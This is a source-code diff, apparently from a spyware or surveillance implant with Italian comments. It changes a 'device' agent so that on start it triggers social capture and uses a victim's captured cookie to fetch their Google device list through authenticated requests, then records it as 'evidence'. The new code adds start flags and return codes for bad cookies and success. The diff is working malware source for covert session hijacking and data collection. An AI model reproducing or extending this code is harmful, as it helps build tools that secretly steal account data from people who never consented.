@@ -3,7 +3,7 @@
 
 extern void CheckProcessStatus();
 extern DWORD HttpSocialRequest(WCHAR *Host, WCHAR *verb, WCHAR *resource, WCHAR *pwszHeader, DWORD port, BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, char *cookies, DWORD dwMaxSize=0);
-BOOL g_bSendGoogleDevice = TRUE;
+//BOOL bSendGoogleDevice = FALSE;
 
 struct deviceinfo {
 	struct {
@@ -446,8 +446,20 @@ DWORD __stdcall PM_DeviceInfoStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	// Questo agente non ha stato started/stopped, ma quando
 	// viene avviato esegue un'azione istantanea.
-	if (bStartFlag && bReset) 
+	if (bStartFlag && bReset)
+	{
 		DumpDeviceInfo();
+
+		//enable the google device evidence
+		bPM_GoogleDeviceStarted = TRUE;
+
+		StartSocialCapture();
+	}
+	else
+	{
+		//enable the google device evidence
+		bPM_GoogleDeviceStarted = FALSE;
+	}
 
 	return 1;
 }
@@ -461,6 +473,7 @@ DWORD __stdcall PM_DeviceInfoInit(JSONObject elem)
 
 void PM_DeviceInfoRegister()
 {
+	bPM_GoogleDeviceStarted = FALSE;
 	AM_MonitorRegister(L"device", PM_DEVICEINFO, NULL, (BYTE *)PM_DeviceInfoStartStop, (BYTE *)PM_DeviceInfoInit, NULL);
 }
 
@@ -583,16 +596,15 @@ DWORD GDev_ExtractDevList(LPWSTR *pwszFormattedList, LPSTR pszRecvBuffer)
 
 
 //get the device list
-DWORD GDev_GetDevices(LPSTR pszCookie)
+DWORD HandleGoogleDevices(LPSTR pszCookie)
 {	
 	struct  deviceinfo di;	
 	LPWSTR	pwszDevicesList=NULL;
 	LPSTR	pszRecvBuffer=NULL;
-	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
-	CHAR    pszBuf[128];
+	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;	
 
-	if(!g_bSendGoogleDevice)		
-		return FALSE;
+	if(!bPM_GoogleDeviceStarted)		
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	CheckProcessStatus();
 	//get conn parameters	
@@ -610,7 +622,7 @@ DWORD GDev_GetDevices(LPSTR pszCookie)
 	if((dwRet != 0) || (dwBufferSize == 0))
 	{
 		znfree(&pszRecvBuffer);
-		return FALSE;
+		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 
 	//extract the device list from the received buffer
@@ -618,14 +630,15 @@ DWORD GDev_GetDevices(LPSTR pszCookie)
 	znfree(&pszRecvBuffer);
 
 	if((!dwRet) || (pwszDevicesList == NULL))
-		return FALSE;
+		return SOCIAL_REQUEST_BAD_COOKIE;
 
 	CheckProcessStatus();
 	//get the device info
 	DumpDeviceInfo(pwszDevicesList);
 	
 	//send the google device only once
-	g_bSendGoogleDevice = FALSE;
+//	bSendGoogleDevice = FALSE;
+	bPM_GoogleDeviceStarted = FALSE;
 
-	return TRUE;
+	return SOCIAL_REQUEST_SUCCESS;
 }
